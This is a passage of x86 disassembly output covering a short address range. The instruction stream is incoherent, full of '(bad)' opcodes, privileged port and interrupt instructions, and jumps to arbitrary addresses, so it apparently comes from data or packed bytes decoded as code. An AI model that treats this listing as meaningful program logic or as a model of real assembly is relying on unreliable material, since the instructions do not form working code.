  40d06f:	jbe    0x40d08a
  40d071:	or     esi,DWORD PTR ds:0x9b9b82e2
  40d077:	jnp    0x40d03c
  40d079:	xchg   edi,eax
  40d07a:	dec    esp
  40d07b:	inc    ebx
  40d07c:	cdq    
  40d07d:	push   ecx
  40d07e:	clc    
  40d07f:	jl     0x40d08d
  40d081:	mov    bl,0xa3
  40d083:	fiadd  DWORD PTR [eax+0x64425eea]
  40d089:	std    
  40d08a:	fwait
  40d08b:	push   cs
  40d08c:	mov    BYTE PTR [ecx+0x60cc4de0],dh
  40d092:	jle    0x40d032
  40d094:	jb     0x40d0e5
  40d096:	sti    
  40d097:	xor    bl,dl
  40d099:	test   BYTE PTR [eax+0x4ba3d560],0xb5
  40d0a0:	dec    esi
  40d0a1:	xchg   DWORD PTR [eax-0x72],edx
  40d0a4:	repnz enter 0x26ef,0x8e
  40d0a9:	dec    eax
  40d0aa:	fld    DWORD PTR [ebx-0x7db13152]
  40d0b0:	out    0x12,eax
  40d0b2:	test   eax,0x15cc4521
  40d0b7:	cli    
  40d0b8:	(bad)  
  40d0b9:	xchg   ebx,eax
  40d0ba:	out    dx,eax
  40d0bb:	pop    ds
  40d0bc:	xchg   ebx,eax
  40d0bd:	fdiv   st(7),st
  40d0bf:	jo     0x40d0ff
  40d0c1:	aas    
  40d0c2:	mov    ds:0x1ed29270,eax
  40d0c7:	test   DWORD PTR [edi+0x41],esi
  40d0ca:	mov    ds:0x8ffc233a,eax
  40d0cf:	pop    edi
  40d0d0:	or     cl,BYTE PTR [ebp-0x5a7938e7]
  40d0d6:	jnp    0x40d0e1
  40d0d8:	outs   dx,DWORD PTR ds:[esi]
  40d0d9:	jae    0x40d125
  40d0db:	les    ebx,FWORD PTR [edx]
  40d0dd:	jne    0x40d11f
  40d0df:	test   BYTE PTR [ebx],0xce
  40d0e2:	mov    ds:0x9355dd6,al
  40d0e7:	fwait
  40d0e8:	add    al,0x72
  40d0ea:	or     ah,BYTE PTR [ecx-0x50]
  40d0ed:	xor    dh,BYTE PTR [esi]
  40d0ef:	shl    BYTE PTR [ecx-0x7a259877],0x53
  40d0f6:	add    ebx,ebp
  40d0f8:	jge    0x40d166
  40d0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0fb:	in     al,dx
  40d0fc:	xor    BYTE PTR [ebx+0x1c],ah
  40d0ff:	sbb    dl,ah
  40d101:	jns    0x40d0e6
  40d103:	out    0x78,al
  40d105:	push   ebp
  40d106:	loope  0x40d166
  40d108:	jo     0x40d130
  40d10a:	test   eax,0xda080418
  40d10f:	push   esi
  40d110:	iret   
  40d111:	sub    bh,al
  40d113:	sbb    al,0x1e
  40d115:	cwde   
  40d116:	leave  
  40d117:	mov    ch,0xb4
  40d119:	addr16 push esi
  40d11b:	(bad)  
  40d11c:	sub    eax,0x16fc604f
  40d121:	mov    ebx,0x854183bf
  40d126:	sti    
  40d127:	test   eax,0x24920bbb
  40d12c:	cmp    al,0xd5
  40d12e:	dec    esi
  40d12f:	add    DWORD PTR [ecx+ebp*1+0x20],ebp
  40d133:	sub    eax,0xe9384c71
  40d138:	add    DWORD PTR [edx-0x188c7702],ebx
  40d13e:	inc    ebp
  40d13f:	shl    DWORD PTR [eax],1
  40d141:	sub    al,0x14
  40d143:	pop    ebx
  40d144:	in     al,dx
  40d145:	shr    DWORD PTR [eax],1
  40d147:	jne    0x40d179
  40d149:	xor    DWORD PTR [edx+ecx*8-0x37f9b895],0x726aea04
  40d154:	in     eax,dx
  40d155:	sbb    bh,BYTE PTR [ebx-0x9]
  40d158:	xchg   DWORD PTR [ecx+0x4317a43f],ecx
  40d15e:	out    dx,eax
  40d15f:	imul   eax,DWORD PTR [edx],0xffffffe7
  40d162:	xchg   ebx,eax
  40d163:	scas   eax,DWORD PTR es:[edi]
  40d164:	fistp  WORD PTR [esi]
  40d166:	mov    al,0x28
  40d168:	inc    edi
  40d169:	shl    BYTE PTR [edi+0x17],0xd3
  40d16d:	enter  0x3789,0x4d
  40d171:	jno    0x40d125
  40d173:	stos   BYTE PTR es:[edi],al
  40d174:	fistp  DWORD PTR [ecx+0x73f2788f]
  40d17a:	test   DWORD PTR [edi],edx
  40d17c:	and    DWORD PTR [edi-0xd],0x25
  40d180:	ror    DWORD PTR [edx+0x19],0xd6
  40d184:	mov    ebx,esi
  40d186:	repnz int 0x2d
  40d189:	dec    edi
  40d18a:	stos   BYTE PTR es:[edi],al
  40d18b:	inc    ebx
  40d18c:	loope  0x40d16a
  40d18e:	xor    dh,BYTE PTR [eax-0x1]
  40d191:	sbb    ebx,ebp
  40d193:	sbb    BYTE PTR [eax],ch
  40d195:	push   edi
  40d196:	sub    al,0x56
  40d198:	loopne 0x40d206
  40d19a:	push   cs
  40d19b:	cmp    al,0xf8
  40d19d:	ret    0x7a3e
  40d1a0:	fisub  DWORD PTR [esi]
  40d1a2:	adc    BYTE PTR [ecx],bh
  40d1a4:	add    eax,DWORD PTR [edx]
  40d1a6:	jle    0x40d179
  40d1a8:	test   eax,0x693002d8
  40d1ad:	mov    DWORD PTR [eax+ebp*2-0x50],esp
  40d1b1:	repz sbb eax,0x77732730
  40d1b7:	iret   
  40d1b8:	inc    esp
  40d1b9:	stos   DWORD PTR es:[edi],eax
  40d1ba:	div    DWORD PTR [edx]
  40d1bc:	cmp    eax,0xe0ae6edd
  40d1c1:	pop    edi
  40d1c2:	dec    edx
  40d1c3:	imul   ebx,ebp,0x2beaa046
  40d1c9:	cmp    ebp,DWORD PTR [eax]
  40d1cb:	lea    ebx,[esi]
  40d1cd:	or     ch,BYTE PTR [eax+ebp*8+0x4c2681a5]
  40d1d4:	jb     0x40d1e4
  40d1d6:	outs   dx,BYTE PTR ds:[esi]
  40d1d7:	sahf   
  40d1d8:	lods   al,BYTE PTR ds:[esi]
  40d1d9:	mov    bl,0x95
  40d1db:	test   eax,0x7f67a371
  40d1e0:	jmp    0xeb2778d6
  40d1e5:	xor    DWORD PTR ds:0xf133,edx
  40d1ea:	test   BYTE PTR [edi+0x29cb4af9],0x4d
  40d1f1:	pop    ebp
  40d1f2:	xchg   BYTE PTR [ebx-0x31],bl
  40d1f5:	xor    al,0x6c
  40d1f7:	div    BYTE PTR [ecx+0x77]
  40d1fa:	or     ch,dh
  40d1fc:	sub    edi,esi
  40d1fe:	into   
  40d1ff:	mov    esp,edx
  40d201:	jmp    0xaae791f2
  40d206:	repz cmp eax,0x1f171be0
  40d20c:	xor    eax,0xc557c1db
  40d211:	out    0x67,eax
  40d213:	mov    ecx,0x213f58b3
  40d218:	(bad)  [esi]
  40d21a:	fistp  WORD PTR [ecx+0x3725e5a7]
  40d220:	jno    0x40d242
  40d222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d223:	cmc    
  40d224:	jmp    DWORD PTR [eax-0x2652e771]
  40d22a:	mov    dh,BYTE PTR [ebx+0x46]
  40d22d:	and    al,0x91
  40d22f:	fsub   st,st(0)
  40d231:	mov    dl,0xdc
  40d233:	mov    ch,0x67
  40d235:	ins    DWORD PTR es:[edi],dx
  40d236:	push   eax
  40d237:	repnz sbb ebx,0xffffffbd
  40d23b:	repz or DWORD PTR [eax],esp
  40d23e:	adc    bh,BYTE PTR [esi+esi*8+0x66]
  40d242:	psubb  mm6,QWORD PTR [eax]
  40d245:	push   edx
  40d246:	xchg   esp,eax
  40d247:	cdq    
  40d248:	fbstp  TBYTE PTR [ebp-0x7a]
  40d24b:	pop    edx
  40d24c:	call   0x24f0:0xe7307dab
  40d253:	pushf  
  40d254:	push   es
  40d255:	imul   edi,ecx,0xda07d112
  40d25b:	inc    DWORD PTR [ecx]
  40d25d:	cmp    eax,0x5b7243e9
  40d262:	cdq    
  40d263:	daa    
  40d264:	std    
  40d265:	xor    esp,0xffffff9a
  40d268:	out    dx,al
  40d269:	sub    cl,BYTE PTR [edi]
  40d26b:	mov    ah,0x6a
  40d26d:	jp     0x40d2a5
  40d26f:	push   esp
  40d270:	retf   
  40d271:	jle    0x40d2dd
  40d273:	cmp    al,0x20
  40d275:	aad    0x10
  40d277:	or     DWORD PTR [eax-0x70],esp
  40d27a:	mov    fs,esp
  40d27c:	push   ss
  40d27d:	jne    0x40d287
  40d27f:	test   DWORD PTR [esi+0x204c77d0],esi
  40d285:	add    DWORD PTR [edx],0x7
  40d288:	sub    ch,BYTE PTR [edi+0x76a2ce77]
  40d28e:	cs ja  0x40d284
  40d291:	push   0x11
  40d293:	mov    ch,0x66
  40d295:	jmp    FWORD PTR [eax+0x1d75b056]
  40d29b:	loope  0x40d27d
  40d29d:	fmul   st,st(2)
  40d29f:	inc    esp
  40d2a0:	xchg   edx,eax
  40d2a1:	or     ebp,DWORD PTR [esp+edx*1+0x5d]
  40d2a5:	repz xchg esp,eax
  40d2a7:	mov    al,0x29
  40d2a9:	dec    edi
  40d2aa:	int    0xdb
  40d2ac:	mov    BYTE PTR [edx+ebp*2],ah
  40d2af:	and    edx,DWORD PTR [edi-0x6d]
  40d2b2:	sbb    eax,0x762928c6
  40d2b7:	pop    esp
  40d2b8:	push   ecx
  40d2b9:	jmp    0x40d255
  40d2bb:	(bad)  
  40d2bc:	cli    
  40d2bd:	and    BYTE PTR ds:0xaf2df8fc,dh
  40d2c3:	(bad)  
  40d2c4:	xchg   edx,eax
  40d2c5:	aam    0x9b
  40d2c7:	lds    esi,FWORD PTR [ecx+0x5d]
  40d2ca:	xchg   ebp,eax
  40d2cb:	jo     0x40d2f4
  40d2cd:	add    ecx,DWORD PTR [ecx+ebp*8]
  40d2d0:	xchg   ebx,eax
  40d2d1:	jecxz  0x40d28e
  40d2d3:	cld    
  40d2d4:	add    eax,0xcf8390ef
  40d2d9:	cmp    DWORD PTR [eax+0x15],edi
  40d2dc:	inc    esp
  40d2dd:	mov    esi,0xf96e3780
  40d2e2:	cmc    
  40d2e3:	mov    esi,0xf7029b9
  40d2e8:	out    dx,al
  40d2e9:	inc    ecx
  40d2ea:	gs pop edi
  40d2ec:	mov    ds:0xc294dcd3,eax
  40d2f1:	arpl   WORD PTR [eax+0x52],bx
  40d2f4:	das    
  40d2f5:	scas   al,BYTE PTR es:[edi]
  40d2f6:	aam    0xe2
  40d2f8:	cmp    DWORD PTR [ebp+0x78],ebx
  40d2fb:	mov    WORD PTR cs:[ebp-0x67],fs
  40d2ff:	enter  0xf5d,0x2c
  40d303:	dec    esp
  40d304:	push   cs
  40d305:	es call 0x691c2b4
  40d30b:	pop    es
  40d30c:	and    esp,edx
  40d30e:	mov    ds:0xbe1dd7b9,eax
  40d313:	lods   eax,DWORD PTR ds:[esi]
  40d314:	(bad)  
  40d315:	jns    0x40d330
  40d317:	xor    ch,0x6f
  40d31a:	xor    al,0xaa
  40d31c:	nop
  40d31d:	inc    edx
  40d31e:	mov    edi,0x3bf14e6a
  40d323:	xchg   esp,eax
  40d324:	xlat   BYTE PTR ds:[ebx]
  40d325:	fsubr  QWORD PTR [edx-0x68]
  40d328:	jae    0x40d372
  40d32a:	jnp    0x40d2d3
  40d32c:	xor    BYTE PTR [ecx-0x46],bh
  40d32f:	div    DWORD PTR [edi-0x3d]
  40d332:	bound  ebp,QWORD PTR [ecx-0x7ec6f952]
  40d338:	push   esp
  40d339:	inc    edx
  40d33a:	into   
  40d33b:	or     al,0x3e
  40d33d:	adc    ebp,DWORD PTR [ebx]
  40d33f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d340:	push   cs
  40d341:	clc    
  40d342:	pop    ds
  40d343:	cld    
  40d344:	adc    DWORD PTR [ecx],eax
  40d346:	xor    edi,DWORD PTR [edx]
  40d348:	mov    dh,BYTE PTR [edx-0x1f238f1]
  40d34e:	in     al,0x70
  40d350:	lods   eax,DWORD PTR ds:[esi]
  40d351:	out    dx,eax
  40d352:	and    al,0xc9
  40d354:	hlt    
  40d355:	rol    BYTE PTR [edx+edi*4-0x72da714d],1
  40d35c:	mov    esi,0x2be7a28e
  40d361:	(bad)  
  40d362:	cld    
  40d363:	stc    
  40d364:	shl    DWORD PTR [edx+edx*4+0x694fe164],1
  40d36b:	js     0x40d394
  40d36d:	inc    eax
  40d36e:	call   0xdcd6:0x704d8368
  40d375:	idiv   DWORD PTR [esi+eax*1]
  40d378:	xchg   DWORD PTR [ecx+0x32267710],ecx
  40d37e:	sub    dh,ch
  40d380:	popaw  
  40d382:	retf   0xb84
  40d385:	cmp    al,0xaf
  40d387:	gs push ebx
  40d389:	cmp    edi,esp
  40d38b:	mov    esi,0xcce89d61
  40d390:	or     dh,BYTE PTR [edi]
  40d392:	data16 sahf 
  40d394:	push   cs
  40d395:	push   ss
  40d396:	mov    dh,0xfb
  40d398:	inc    eax
  40d399:	adc    eax,0xd7c74ce7
  40d39e:	dec    esi
  40d39f:	mov    al,0xe7
  40d3a1:	or     eax,0xdc7b1a0
  40d3a6:	push   ss
  40d3a7:	div    DWORD PTR [ebp+0xbe99c97]
  40d3ad:	jp     0x40d3ba
  40d3af:	iret   
  40d3b0:	sub    bh,BYTE PTR [ebx]
  40d3b2:	cmp    eax,0x532486c4
  40d3b7:	gs sbb eax,0xea1e7abc
  40d3bd:	jp     0x40d3ac
  40d3bf:	adc    ch,BYTE PTR [edx-0xfb6efe7]
  40d3c5:	adc    eax,0x22e36490
  40d3ca:	shl    DWORD PTR [eax+0x21],1
  40d3cd:	cmp    al,0x14
  40d3cf:	into   
  40d3d0:	pop    ebx
  40d3d1:	xchg   ecx,eax
  40d3d2:	or     esp,ecx
  40d3d4:	sub    al,0xf7
  40d3d6:	xor    DWORD PTR [edi+edi*2-0xc],edi
  40d3da:	xchg   edi,ecx
  40d3dc:	sub    DWORD PTR [esi+0x7c],ebx
  40d3df:	in     al,0x81
  40d3e1:	push   edx
  40d3e2:	mov    BYTE PTR [ecx-0x1d],bl
  40d3e5:	mov    bh,ch
  40d3e7:	mov    ecx,0x5af80d0
  40d3ec:	int    0x66
  40d3ee:	and    edx,eax
  40d3f0:	cmp    al,BYTE PTR [ecx-0x77]
  40d3f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3f4:	dec    edi
  40d3f5:	cdq    
  40d3f6:	cmp    bh,BYTE PTR [edx]
  40d3f8:	popf   
  40d3f9:	and    edi,DWORD PTR [edi+0x1c]
  40d3fc:	sbb    bh,BYTE PTR [edi-0xa96e517]
  40d402:	push   eax
  40d403:	imul   DWORD PTR [eax+0x52882170]
  40d409:	cmp    DWORD PTR [edi],eax
  40d40b:	xor    eax,0x2933fb14
  40d410:	cmc    
  40d411:	rcr    BYTE PTR [edi-0x175551a7],0xfb
  40d418:	fmul   DWORD PTR [edx-0x9884010]
  40d41e:	pop    ebp
  40d41f:	stc    
  40d420:	shl    dl,1
  40d422:	test   al,0x46
  40d424:	popf   
  40d425:	hlt    
  40d426:	(bad)  
  40d427:	mov    esi,0x7dfda954
  40d42c:	sub    BYTE PTR [esi+0x2b],ah
  40d42f:	add    bl,BYTE PTR [edx]
  40d431:	ss out dx,eax
  40d433:	push   esp
  40d434:	jge    0x40d486
  40d436:	ja     0x40d451
  40d438:	sbb    al,0x39
  40d43a:	mov    al,ds:0xf5841002
  40d43f:	cmc    
  40d440:	loop   0x40d434
  40d442:	nop
  40d443:	jmp    FWORD PTR [ecx+0x6]
  40d446:	jecxz  0x40d3ec
  40d448:	out    0xe4,eax
  40d44a:	test   al,0x95
  40d44c:	jb     0x40d4a1
  40d44e:	rcr    DWORD PTR [edx],1
  40d450:	call   0x62c7:0xab299831
  40d457:	cmp    eax,0x49108012
  40d45c:	vpavgb ymm6,ymm2,YMMWORD PTR [ebp-0x73]
  40d461:	imul   DWORD PTR [edx+edi*8]
  40d464:	inc    eax
  40d465:	test   ebx,esp
  40d467:	mov    BYTE PTR [edi],dl
  40d469:	dec    edx
  40d46a:	adc    esp,DWORD PTR ds:0x9e411764
  40d470:	dec    eax
  40d471:	fcomp  st(2)
  40d473:	je     0x40d4a3
  40d475:	call   0x2fb35e7d
  40d47a:	sub    ch,cl
  40d47c:	sbb    edi,ecx
  40d47e:	addr16 popa 
  40d480:	sahf   
  40d481:	or     eax,0xa764f583
  40d486:	(bad)  
  40d487:	cdq    
  40d488:	js     0x40d497
  40d48a:	jmp    0x40d4ab
  40d48c:	call   0x5ef7:0xd0248714
  40d493:	je     0x40d43d
  40d495:	bound  edi,QWORD PTR [eax+eiz*8-0x1d4ee75b]
  40d49c:	fstp   DWORD PTR [edx-0x3e]
  40d49f:	dec    ecx
  40d4a0:	ins    DWORD PTR es:[edi],dx
  40d4a1:	jbe    0x40d4a9
  40d4a3:	test   BYTE PTR [eax],dh
  40d4a5:	jl     0x40d46f
  40d4a7:	jle    0x40d446
  40d4a9:	mov    ds:0xbb236dff,al
  40d4ae:	pop    es
  40d4af:	mov    ebx,0x4bda01e0
  40d4b4:	ror    BYTE PTR [ebx],cl
  40d4b6:	mov    di,0xcdc1
  40d4ba:	pop    ss
  40d4bb:	fidivr DWORD PTR [ecx]
  40d4bd:	lea    esi,[eax-0x76bbabdd]
  40d4c3:	cdq    
  40d4c4:	(bad)  
  40d4c5:	jno    0x40d47c
  40d4c7:	stos   BYTE PTR es:[edi],al
  40d4c8:	test   BYTE PTR [eax+0x1],dl
  40d4cb:	fwait
  40d4cc:	push   ebp
  40d4cd:	and    al,0x56
  40d4cf:	cmc    
  40d4d0:	xor    al,0x1c
  40d4d2:	xor    ebx,esp
  40d4d4:	shr    DWORD PTR [ecx+0x68],cl
  40d4d7:	sar    DWORD PTR [edi],cl
  40d4d9:	xchg   DWORD PTR [ebx-0x41],edi
  40d4dc:	fimul  DWORD PTR [ecx-0x2f]
  40d4df:	jno    0x40d4ed
  40d4e1:	or     DWORD PTR [ebx-0x54846a91],ecx
  40d4e7:	and    BYTE PTR [ecx],0xe6
  40d4ea:	xchg   esp,eax
  40d4eb:	imul   BYTE PTR ds:0x888d9dde
  40d4f1:	les    edx,FWORD PTR [ebx+0x6772d337]
  40d4f7:	(bad)  
  40d4f8:	mov    eax,0x1476fcb2
  40d4fd:	(bad)  
  40d4fe:	jnp    0x40d4ac
  40d500:	aad    0x9b
  40d502:	pop    ss
  40d503:	mov    bh,0xfb
  40d505:	(bad)  
  40d506:	adc    BYTE PTR [esi],al
  40d508:	ja     0x40d574
  40d50a:	jo     0x40d4fb
  40d50c:	push   eax
  40d50d:	cmp    al,BYTE PTR [ebx]
  40d50f:	jmp    0xe9a3:0x45e5e6b2
  40d516:	cmp    al,0xb6
  40d518:	mov    cl,0x9e
  40d51a:	mov    es,WORD PTR [ecx]
  40d51c:	mov    esi,0xd2a397
  40d521:	sub    al,0x45
  40d523:	ret    
  40d524:	imul   esi,DWORD PTR ds:0xe3fd9b30,0x26577ab0
  40d52e:	jno    0x40d54d
  40d530:	inc    esp
  40d531:	inc    ebx
  40d532:	(bad)  [ecx-0x3b]
  40d535:	rol    BYTE PTR [ebp+0x738f86fd],1
  40d53b:	cmp    eax,0x70fafcf5
  40d540:	mov    eax,ds:0x1245d1ff
  40d545:	stos   BYTE PTR es:[edi],al
  40d546:	xor    DWORD PTR [edx],ebx
  40d548:	push   ds
  40d549:	out    0x19,al
  40d54b:	push   cs
  40d54c:	mov    ebx,0xca1346bf
  40d551:	and    ebp,ebp
  40d553:	fistp  WORD PTR [ebp+0x3c]
  40d556:	and    ecx,esp
  40d558:	test   bh,al
  40d55a:	and    al,0xe4
  40d55d:	inc    ebp
  40d55e:	xlat   BYTE PTR ds:[ebx]
  40d55f:	iret   
  40d560:	je     0x40d520
  40d562:	mov    esp,0xab7ba118
  40d567:	xlat   BYTE PTR ds:[ebx]
  40d568:	inc    eax
  40d569:	push   DWORD PTR [ebx+0x1761ca4a]
  40d56f:	aad    0xc0
  40d571:	shl    BYTE PTR [edi-0x1],cl
  40d574:	xor    BYTE PTR [edx],0x41
  40d577:	in     al,0xda
  40d579:	cmp    al,BYTE PTR [eiz*1-0x66b6bc4d]
  40d580:	xchg   DWORD PTR [esi+0x9],esi
  40d583:	fcomp  DWORD PTR [edx+0x34]
  40d586:	mov    DWORD PTR [esi-0x2d9e6699],ebx
  40d58c:	pop    ss
  40d58d:	sub    al,0xa1
  40d58f:	fucomi st,st(3)
  40d591:	int3   
  40d592:	or     al,0xcd
  40d594:	dec    esp
  40d595:	mov    DWORD PTR [edx+0x24],esp
  40d598:	int3   
  40d599:	mov    eax,ds:0xca09f6e3
  40d59e:	or     eax,0xfdc8793f
  40d5a3:	jmp    0x40d5dc
  40d5a5:	mov    ds:0xd19fbd8,al
  40d5aa:	fdivr  QWORD PTR [esi]
  40d5ac:	inc    edx
  40d5ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5ae:	imul   ecx,DWORD PTR [ecx-0x64372630],0x847241f8
  40d5b8:	mov    esp,0xaa56f9e0
  40d5bd:	push   ss
  40d5be:	cli    
  40d5bf:	lods   eax,DWORD PTR ds:[esi]
  40d5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5c1:	(bad)  [ebx+edx*1+0x327ee4b4]
  40d5c8:	fst    QWORD PTR [edx]
  40d5ca:	and    dh,BYTE PTR [edi+0x4b35b6ff]
  40d5d0:	push   0xffffff89
  40d5d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5d3:	mov    al,0xf5
  40d5d5:	mov    BYTE PTR [ebx],cl
  40d5d7:	lods   eax,DWORD PTR ds:[esi]
  40d5d8:	adc    al,0xbf
  40d5da:	mov    al,ds:0xa7140b00
  40d5df:	xchg   ebx,eax
  40d5e0:	mov    ch,0x8e
  40d5e2:	repnz mov bl,0x35
  40d5e5:	mov    eax,ds:0x570ffa1b
  40d5ea:	sbb    al,0x96
  40d5ec:	je     0x40d5a7
  40d5ee:	ret    
  40d5ef:	sub    BYTE PTR [edi-0x159c0ab4],0x57
  40d5f6:	xchg   edx,eax
  40d5f7:	inc    esp
  40d5f8:	dec    ebp
  40d5f9:	jns    0x40d644
  40d5fb:	popf   
  40d5fc:	(bad)  
  40d5fd:	push   es
  40d5fe:	adc    ecx,DWORD PTR [edx]
  40d600:	out    dx,al
  40d601:	loope  0x40d5cf
  40d603:	jae    0x40d608
  40d605:	repz into 
  40d607:	push   esp
  40d608:	adc    eax,0x7ffa5195
  40d60d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d60e:	and    DWORD PTR ds:0xbacf9d23,esp
  40d614:	push   ebp
  40d615:	mov    edx,0x9470d2b
  40d61a:	or     BYTE PTR [edi+esi*1-0x3174d746],0x1f
  40d622:	addr16 jnp 0x40d5aa
  40d625:	adc    bl,BYTE PTR gs:[eax+eiz*2-0x15]
  40d62a:	sbb    ah,BYTE PTR [esi+0x42a4414a]
  40d630:	jno    0x40d5f9
  40d632:	stos   DWORD PTR es:[edi],eax
  40d633:	sub    ah,dh
  40d635:	dec    edi
  40d636:	dec    ebx
  40d637:	cmp    eax,0xb1367368
  40d63c:	xlat   BYTE PTR ds:[ebx]
  40d63d:	jp     0x40d610
  40d63f:	push   0xfd491218
  40d644:	repz (bad) 
  40d646:	retf   0x2b4c
  40d649:	mov    al,ds:0xf6a6c3e7
  40d64e:	mov    cl,BYTE PTR [ecx+0x6a3f67c0]
  40d654:	stos   BYTE PTR es:[edi],al
  40d655:	mov    BYTE PTR [edx+0x3d06ae02],ch
  40d65b:	push   ds
  40d65c:	arpl   si,di
  40d65e:	push   esi
  40d65f:	repnz loopne 0x40d6b4
  40d662:	mov    eax,0x245369d
  40d667:	dec    ebp
  40d668:	sar    BYTE PTR [eax],1
  40d66a:	addr16 enter 0x5e3c,0xb3
  40d66f:	add    DWORD PTR [eax],ecx
  40d671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d672:	sbb    eax,0xf2f90b99
  40d677:	push   ecx
  40d678:	fdiv   st(2),st
  40d67a:	ror    DWORD PTR [ebx+0x63],1
  40d67d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d67e:	add    al,0xb1
  40d680:	mov    dh,ch
  40d682:	xchg   ebx,eax
  40d683:	loopne 0x40d607
  40d685:	call   FWORD PTR [esi-0x3eded05e]
  40d68b:	stos   DWORD PTR es:[edi],eax
  40d68c:	pop    esi
  40d68d:	jnp    0x40d6c2
  40d68f:	data16 cli 
  40d691:	je     0x40d69c
  40d693:	test   eax,0x1bc3d86c
  40d698:	es stc 
  40d69a:	mov    ecx,cs
  40d69c:	inc    esi
  40d69d:	fs jle 0x40d6bb
  40d6a0:	stos   DWORD PTR es:[edi],eax
  40d6a1:	in     eax,dx
  40d6a2:	loope  0x40d6b2
  40d6a4:	push   edx
  40d6a5:	jbe    0x40d643
  40d6a7:	add    ebp,edi
  40d6a9:	loop   0x40d6d1
  40d6ab:	pop    ss
  40d6ac:	push   esi
  40d6ad:	sub    edi,DWORD PTR [esi-0x79]
  40d6b0:	mov    ?,esp
  40d6b2:	stos   DWORD PTR es:[edi],eax
  40d6b3:	fwait
  40d6b4:	aas    
  40d6b5:	and    BYTE PTR [eax-0x36],0xa6
  40d6b9:	mov    ah,bl
  40d6bb:	push   ebp
  40d6bc:	addr16 sti 
  40d6be:	cmp    eax,0x57887164
  40d6c3:	xchg   edx,eax
  40d6c4:	sub    eax,0x3bd45cd0
  40d6c9:	mov    edi,0xb65373b8
  40d6ce:	lods   al,BYTE PTR ds:[esi]
  40d6cf:	sub    BYTE PTR [ecx-0x779ccbef],0x70
  40d6d6:	ins    BYTE PTR es:[edi],dx
  40d6d7:	dec    esp
  40d6d8:	aad    0x32
  40d6da:	dec    eax
  40d6db:	add    eax,0x39b3a645
  40d6e0:	dec    ecx
  40d6e1:	xor    al,0xfd
  40d6e3:	sub    BYTE PTR [esi],dl
  40d6e5:	lock add DWORD PTR [esi],0x13
  40d6e9:	retf   0x5ac0
  40d6ec:	mov    edx,0x33f7a292
  40d6f1:	icebp  
  40d6f2:	bound  esi,QWORD PTR [edi]
  40d6f4:	xchg   edx,eax
  40d6f5:	out    0x87,al
  40d6f7:	gs mov edx,eax
  40d6fa:	add    edi,DWORD PTR [eax+0x482e525]
  40d700:	xor    eax,0x7d20d0af
  40d705:	test   al,0x36
  40d707:	pusha  
  40d708:	retfw  
  40d70a:	fimul  WORD PTR [edi-0x3ec98d83]
  40d710:	shl    BYTE PTR [edi],1
  40d712:	inc    edx
  40d713:	inc    edi
  40d714:	ret    
  40d715:	inc    esi
  40d716:	(bad)  
  40d717:	adc    DWORD PTR [eax+0x66],ebp
  40d71a:	mov    ah,0x9f
  40d71c:	xor    BYTE PTR [edx-0x7815e053],dl
  40d722:	sahf   
  40d723:	cwde   
  40d724:	mov    ecx,fs
  40d726:	lahf   
  40d727:	or     ebx,esi
  40d729:	aaa    
  40d72a:	ds pop ds
  40d72c:	call   0xa1b65089
  40d731:	fld    DWORD PTR [eax]
  40d733:	(bad)  
  40d734:	jecxz  0x40d738
  40d736:	dec    ecx
  40d737:	mov    cl,0xf
  40d739:	xlat   BYTE PTR ds:[ebx]
  40d73a:	addr16 push 0x8468806d
  40d740:	jp     0x40d738
  40d742:	mov    ecx,0x6e59e91e
  40d747:	xchg   ebx,eax
  40d748:	in     eax,dx
  40d749:	or     DWORD PTR [ebp-0x70dc66ec],esp
  40d74f:	in     eax,dx
  40d750:	out    dx,al
  40d751:	pushf  
  40d752:	ja     0x40d7d2
  40d754:	(bad)  
  40d755:	and    DWORD PTR [edi-0x46],edx
  40d758:	test   al,0x4a
  40d75a:	push   es
  40d75b:	jmp    0x3e3671aa
  40d760:	cmp    eax,0x8b50dbde
  40d765:	mov    bh,0x60
  40d767:	jp     0x40d77c
  40d769:	pop    esp
  40d76a:	aad    0x47
  40d76c:	sbb    DWORD PTR [ebx-0x75d21476],edi
  40d772:	add    eax,0x74e2a7fc
  40d777:	cmc    
  40d778:	int3   
  40d779:	cmp    eax,0xa8c0c4bc
  40d77e:	jb     0x40d73e
  40d780:	mov    eax,ds:0x98c667d9
  40d785:	rcr    BYTE PTR [ebp+0x5d],0x95
  40d789:	loope  0x40d7f5
  40d78b:	sbb    eax,0x1d525e1e
  40d790:	xor    edx,DWORD PTR [edx-0x3ab13f8]
  40d796:	in     al,dx
  40d797:	dec    ebx
  40d798:	mov    ecx,0xa0ffea76
  40d79d:	test   ah,cl
  40d79f:	imul   eax
  40d7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7a2:	sub    BYTE PTR [ecx-0x28],cl
  40d7a5:	sbb    eax,0xaa81e34e
  40d7aa:	push   es
  40d7ab:	adc    cl,BYTE PTR [ebp+0x1f]
  40d7ae:	pusha  
  40d7af:	daa    
  40d7b0:	rcr    edx,cl
  40d7b2:	pop    edx
  40d7b3:	scas   eax,DWORD PTR es:[edi]
  40d7b4:	push   edx
  40d7b5:	push   ebp
  40d7b6:	arpl   WORD PTR [ebp-0x42],dx
  40d7b9:	cld    
  40d7ba:	jno    0x40d7ba
  40d7bc:	cmp    eax,0x11963e71
  40d7c1:	in     eax,dx
  40d7c2:	rcr    BYTE PTR [esi+0x112d3919],1
  40d7c8:	mov    dl,BYTE PTR [esi]
  40d7ca:	push   edi
  40d7cb:	or     bh,BYTE PTR [edi-0xa]
  40d7ce:	inc    ebx
  40d7cf:	push   es
  40d7d0:	xor    DWORD PTR [ebx+0x4b],edi
  40d7d3:	ins    BYTE PTR es:[edi],dx
  40d7d4:	mov    esi,0x276d5730
  40d7d9:	xchg   edx,eax
  40d7da:	mov    ds:0x54264c68,eax
  40d7df:	shl    DWORD PTR [ecx-0x5d],1
  40d7e2:	popf   
  40d7e3:	pop    esi
  40d7e4:	ret    
  40d7e5:	in     eax,dx
  40d7e6:	(bad)  
  40d7e7:	in     eax,0xfb
